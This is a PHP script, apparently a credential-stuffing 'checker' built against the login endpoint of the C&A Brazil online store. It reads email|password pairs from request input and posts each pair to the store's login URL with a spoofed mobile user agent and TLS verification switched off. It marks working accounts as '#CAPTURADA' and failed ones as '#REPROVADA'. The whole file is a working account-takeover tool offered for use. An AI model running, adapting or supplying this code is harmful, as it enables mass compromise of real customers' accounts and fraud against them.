<?php


extract($_GET);
error_reporting(0);

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

{
	$separador = "|"; //<--
	$e = explode("\r\n", $lista);
	$c = count($e);
	for ($i=0; $i < $c; $i++) { 
		$explode = explode($separador, $e[$i]);
		Testar(trim($explode[0]),trim($explode[1]));
	}
}
function Testar($email,$senha){
	if (file_exists(getcwd()."/cookies.txt")) {
		unlink(getcwd()."/cookies.txt");
	}

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://ecommerce.cea.com.br/vtex/login");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookies.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookies.txt");
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 9; moto g(6)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	    
'Host: ecommerce.cea.com.br',
'accept: */*',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 9; moto g(6)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.cea.com.br',
'referer: https://www.cea.com.br/',


		));
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&senha='.$senha.'');
	
	$resposta = curl_exec($ch);
	
//	echo $resposta;
	
	
	if (strpos($resposta, '"authStatus":"Success"')) { //RESPOSTA

		echo "<font class='label label-success'>#CAPTURADA</font> ".$email." | ".$senha." | ".$nome."";
		flush();
		ob_flush();

	}else{
		echo "<font class='label label-danger'>#REPROVADA</font> ".$email." | ".$senha." ";
		flush();
		ob_flush();
	}
}




?>
